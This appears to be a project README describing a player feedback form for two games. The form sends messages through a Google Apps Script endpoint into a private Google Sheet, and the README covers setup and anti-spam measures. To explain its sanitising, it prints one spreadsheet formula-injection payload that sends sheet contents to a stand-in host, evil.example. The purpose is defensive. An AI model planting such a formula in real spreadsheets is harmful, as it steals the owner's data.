# Feedback: a way for players to write back

A **Have Feedback?** button in the bottom-left corner of the choose-your-creature screen, in both
games. It opens a short form — email and a message — and the message lands as a row in a private
Google Sheet, with an email to say it arrived.

**Unconfigured, it does not exist.** With no endpoint compiled in, the button never renders:
`npm run dev`, every headless tool, the layout guard and any fork behave exactly as they did before
this was written. Turning it on is setting one repository variable; turning it off is deleting it.
That is the same arrangement the invite gate uses in the `mando` repository, and for the same
reason — a deploy that loses its variable should publish a site without a button rather than a site
with a button that fails.

**One endpoint, both games, and whatever comes next.** Nothing on the Apps Script side lists the
games. `game` is a plain string the page sends — the era's id, `cambrian` or `devonian` — and it
lands in its own column. A third era, a stats page or another project needs no change to the script
at all: send a new string and its rows appear alongside the others.

**Email is required.** It is not verified and it is not meant to be: it is a reply path, so that a
bug report can become a conversation. Nothing else is done with it.

---

## Setting it up

### 1. The spreadsheet

Make a Google Sheet — call it whatever you like. It is private to your Google account by default,
and **leave it that way**: do not share it, and do not use *File ▸ Share ▸ Publish to web*.

**Use a new Sheet, not the one behind the invite gate.** This endpoint is world-writable — it has
to be; a stranger with a bug report has no invite — while the gate's is the guest list for every
game. Sharing one deployment would publish the gate's URL in every bundle, let a bug here reach the
`Codes` tab, and let a flood of feedback spend the daily script quota that the front door of every
game depends on. A broken feedback form is annoying; a broken gate locks your friends out.

You do not have to add any tabs. `Feedback` and `Blocked` create themselves with their headers the
first time each is used.

### 2. The endpoint

1. In the Sheet: **Extensions ▸ Apps Script**.
2. Delete the placeholder and paste all of [`tools/feedback/Code.gs`](../tools/feedback/Code.gs).
3. Leave `SHEET_ID` as `''` — the script is bound to this Sheet already.
4. Set `NOTIFY_EMAIL` near the top to the address that should hear about new feedback. Leaving it
   empty is allowed: the rows still land, you just have to go and look.
5. **Deploy ▸ New deployment ▸ Web app**, with:
   - *Execute as*: **Me**
   - *Who has access*: **Anyone**
6. Copy the deployment URL. It ends in `/exec`.

*Who has access: Anyone* sounds alarming and is correct. It means the URL can be POSTed to without a
Google login, which is exactly what a player's browser has to do; the script decides what to do with
what arrives. It does not share the spreadsheet with anyone.

**"Google hasn't verified this app"** — expected on the first deploy. Click through it: **Advanced**,
then **Go to _&lt;your project&gt;_ (unsafe)**, then **Allow**. You are the developer, the reviewer
and the only person being asked, and with Turnstile off the script's only permissions are this
spreadsheet and sending mail as you. Players never see this — they never talk to Apps Script as a
signed-in Google user, or at all.

### 3. Check it answers anonymously

Open the `/exec` URL in a browser — a private window is the better check. It should print:

```json
{"ok":true,"service":"feedback"}
```

A Google sign-in page instead means *Who has access* is not **Anyone**. Fix it with **Deploy ▸
Manage deployments ▸** pencil ▸ *Who has access: Anyone* ▸ Deploy, which keeps the same URL. Note
that *Anyone with a Google account* is a different setting and fails the same way: the browser's
POST is anonymous, and a redirect to Google fails CORS.

Then send yourself a row. Paste this into the browser console on any page, with your URL in it:

```js
fetch('PASTE_EXEC_URL', { method: 'POST',
  headers: { 'Content-Type': 'text/plain;charset=utf-8' },
  body: JSON.stringify({ kind: 'feedback', game: 'test', email: 'you@example.com',
                         message: 'hello', elapsed: 9000 }) }).then(r => r.json()).then(console.log)
```

`{ok: true}`, a row in `Feedback`, and an email. If that works, everything after this is wiring.

### 4. Turn it on

Set a **`FEEDBACK_ENDPOINT`** repository variable to the `/exec` URL: **Settings ▸ Secrets and
variables ▸ Actions ▸ Variables**, on the *repository's* Settings tab, not your account's. The
deploy workflow passes it to the build as `VITE_FEEDBACK_ENDPOINT`.

It is a variable rather than a secret because **it is not a secret**: it is compiled into the
published bundle, so anyone who opens the site can read it either way. What stops it being abused is
on the far side, not its obscurity.

Push, wait for Pages, and the button is on the choice screen of both games.

---

## What arrives

The `Feedback` tab, one row per message:

| column | meaning |
|---|---|
| when | server time, the one field here that is genuinely ours |
| game | `cambrian` or `devonian` — whatever string the page sent |
| email | their reply address, unverified |
| message | what they wrote, up to 4000 characters |
| who | their name, if the site ever sits behind the invite gate. Empty today |
| version | the commit the build came from, so an old report reads as old |
| screen, timezone, language, user agent, came from | what the browser said about itself |
| handled | yours to tick |

**Read those last five as "what the browser said about itself", never as fact.** Apps Script hands
its `doPost` the body and nothing else — no client IP, no headers — so there is no server-side truth
to check them against, and all of it is trivially forged. They are there because a rendering bug is
a different bug on a phone and on a desktop, and nobody thinks to say which they were on.

Replying to the notification email reaches the player: `replyTo` is set to their address.

---

## Keeping the spambots out

Four layers, none of them a wall, and the honest limit stated first.

**There is no per-visitor rate limit anywhere in this design, and there cannot be.** Apps Script
does not give `doPost` the client IP. The script caps the whole hour instead — 60 accepted rows,
then one `FLOOD` line and silence until the hour turns — which stops a spreadsheet being filled but
does nothing to slow one determined person down.

1. **A honeypot.** A real input, positioned off-screen and out of the tab order and the
   accessibility tree, that no visitor can see or reach. A bot that fills forms by walking their
   inputs fills it; the script drops anything that arrives with it set. This catches most of what
   actually turns up.
2. **A compose floor.** The clock starts when the dialog opens; under three seconds is not somebody
   who typed a sentence. Send stays disabled until then, so a person never meets the rule. Like
   everything else the browser sends, the elapsed time is forgeable — read it as "this submission
   did not even bother to look human".
3. **The hourly caps** above, plus a separate cap of ten notification emails an hour so a flood
   cannot spend the day's mail quota. The rows are the record; the email is only the nudge.
4. **Cloudflare Turnstile**, wired but off.

**Everything a stranger writes is defused before it reaches a cell.** `appendRow` stores a string
as if it had been typed, so a message beginning `=`, `+`, `-` or `@` would be kept as a *live
formula* and evaluated in your browser, with your authority, the moment you opened the sheet —
`=IMPORTXML("https://evil.example/?x="&TEXTJOIN(",",1,A:A),"//a")` sends the sheet's contents to
whoever asked. `safe_()` in the script puts a leading apostrophe on anything that starts like a
formula (invisible in the cell, so "-5 stars, sorry" still reads correctly), strips control
characters, and caps every field's length server-side — the client truncates too, but the client is
a suggestion when the endpoint is world-writable.

A refused submission is answered as if it succeeded, and its message is kept in the `Blocked` tab
with the reason. Both halves are deliberate: a bot told which check it failed tries the next thing,
and a false positive is somebody's bug report, which should be recoverable rather than merely
counted. **Feedback ▸ Blocked attempts (last 20)** in the Sheet's menu shows them without leaving
the page.

### Turning Turnstile on

Worth doing the day junk actually arrives, and not before — it is a Cloudflare account, a widget on
the page, and one real cost:

**It re-adds `UrlFetchApp` to what the script asks for.** Verifying a token means calling
Cloudflare, which is the permission that makes the Google authorisation prompt read alarmingly. This
is a separate script project from the gate, so only this one is affected, and only you ever see the
prompt — but you will have to re-authorise, and it is the reason the gate dropped that scope.

1. Cloudflare dashboard ▸ **Turnstile** ▸ add a widget for your site's hostname. You get a **site
   key** (public) and a **secret key** (not).
2. Put the secret in `TURNSTILE_SECRET` at the top of `Code.gs`, and re-deploy (**Deploy ▸ Manage
   deployments ▸** pencil ▸ Deploy, to keep the URL). Re-authorise when asked.
3. Set a **`TURNSTILE_KEY`** repository variable to the site key. The workflow passes it as
   `VITE_TURNSTILE_KEY` and the dialog renders the widget.
4. Add Cloudflare's script to both entry pages (`index.html` and `devonian/index.html`):
   `<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>`

Verification **fails closed**: a token that cannot be checked is refused. A check you can get past
by breaking it is not a check. Turning it off is emptying the secret, which is a decision rather
than an outage.

Both halves have to move together. A site key with no secret verifies nothing; a secret with no site
key refuses everybody.

---

## Where the code is

| | |
|---|---|
| `tools/feedback/Code.gs` | the Apps Script. Not part of the build — it is pasted into the Sheet |
| `src/shared/feedback.ts` | the endpoint, the payload, and the send. Draws nothing |
| `src/app/Feedback.tsx` | the button and the dialog |
| `src/app/Select.tsx` | mounts `<FeedbackButton />` in the footer, shared by both eras |
| `.github/workflows/pages.yml` | passes the three variables to the build |

`src/shared/feedback.ts` imports nothing from the app and holds no React, so porting the mechanism
to another project is that file, a form of some kind, and the same `FEEDBACK_ENDPOINT` — the same
shape the gate is ported in.

## Adding another game

Send a different `game` string. That is the whole of it — no change to `Code.gs`, no new
deployment, no new Sheet. Inside this repository a new era is carried along for free, because
`Feedback.tsx` reads `ACTIVE_ERA.id` and `Select.tsx` is shared.

## How it fails

- **The endpoint cannot be reached** — the dialog says so and keeps what they typed, so a retry
  costs a click rather than the message. Nothing is queued for later: a promise to send something
  eventually is worse than an honest failure now.
- **No endpoint is configured** — there is no button. That is the difference between "broken" and
  "switched off".
- **Something throws** — the visitor is told it did not send, and the reply says only that. An
  exception string names tabs, ranges and quota states, and the caller here is anonymous; the real
  error goes to the Apps Script execution log, where it is not also handed to whoever caused it.
- **A row cannot be written** — the visitor is still thanked. There is nothing they could do
  differently, and the alternative is a stranger who tried to help being shown an error.
